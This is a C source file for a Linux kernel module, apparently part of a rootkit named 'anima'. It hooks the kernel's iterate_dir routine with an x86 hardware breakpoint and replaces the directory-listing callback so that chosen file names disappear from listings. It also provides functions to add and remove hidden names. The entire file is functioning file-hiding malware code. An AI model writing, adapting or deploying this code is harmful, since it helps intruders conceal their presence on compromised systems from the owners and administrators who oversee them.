#include <linux/kernel.h>

#include <anima/arch.h>
#include <anima/ksyms.h>
#include <anima/libc.h>
#include <anima/vfs.h>

#define MAX_HIDDEN_FILES 50
#define FILENAME_SIZE	 50

static char hidden_file[MAX_HIDDEN_FILES][FILENAME_SIZE] = { {0} };

static int is_name_hidden(const char *name)
{
	for (int i = 0; i < MAX_HIDDEN_FILES; i++) {
		if (hidden_file[i][0] && !anima_strcmp(hidden_file[i], name)) {
			pr_debug("%s: hiding %s\n", __func__, name);
			return 1;
		}
	}

	return 0;
}

/*
 * for kernel versions >= 3.11
 */
static __filldir_t old_filldir;

static int new_filldir(void *__buf, const char *name, int namlen, loff_t offset,
			u64 ino, unsigned int d_type)
{
	if (is_name_hidden(name)) {
		return 0;
	}

	return old_filldir(__buf, name, namlen, offset, ino, d_type);
}

static void iterate_dir_hook(struct pt_regs *regs)
{
#if ARCH_X86
	struct __dir_context *ctx = (struct __dir_context *)regs->si;
#elif ARCH_ARM
	struct __dir_context *ctx = NULL;
#endif

	/*
	 * FIXME: should disable preemption ?
	 * old_filldir can be set by multiple kernel path !!!
	 */
	old_filldir = ctx->actor;
	ctx->actor = new_filldir;
}

/*
 * VFS hook API
 */
void vfs_debug(void)
{
	pr_debug("%s: hidden files:\n", __func__);
	for (int i = 0; i < MAX_HIDDEN_FILES; i++)
		if (hidden_file[i][0])
			pr_debug("\t%s\n", hidden_file[i]);
}

int vfs_hide_filename(const char *name, unsigned int len)
{
	pr_debug("%s: name=%s\n", __func__, name);

	len = len >= FILENAME_SIZE ? FILENAME_SIZE-1 : len;

	for (int i = 0; i < MAX_HIDDEN_FILES; i++) {
		if (!hidden_file[i][0]) {
			ksyms._copy_from_user(hidden_file[i], name, len);
			hidden_file[i][len] = 0;
			return 0;
		}
	}

	return -1;
}

int vfs_unhide_filename(const char *name, unsigned int len)
{
	char kname[FILENAME_SIZE];

	len = len >= FILENAME_SIZE ? FILENAME_SIZE-1 : len;
	if (ksyms._copy_from_user(kname, name, len))
		return -1;

	kname[len] = 0;

	pr_debug("%s: name=%s\n", __func__, kname);

	for (int i = 0; i < MAX_HIDDEN_FILES; i++) {
		if (!anima_strcmp(hidden_file[i], kname)) {
			hidden_file[i][0] = 0;
			pr_debug("hidden\n");
		}
	}

	return 0;
}

void vfs_hook(void)
{
	unsigned long iterate_dir_p = get_symbol_addr("iterate_dir");

	if (!iterate_dir_p)
		return;

#if ARCH_X86
	x86_hw_breakpoint_register(1, iterate_dir_p, DR_RW_EXECUTE,
					0, iterate_dir_hook);
#endif
}
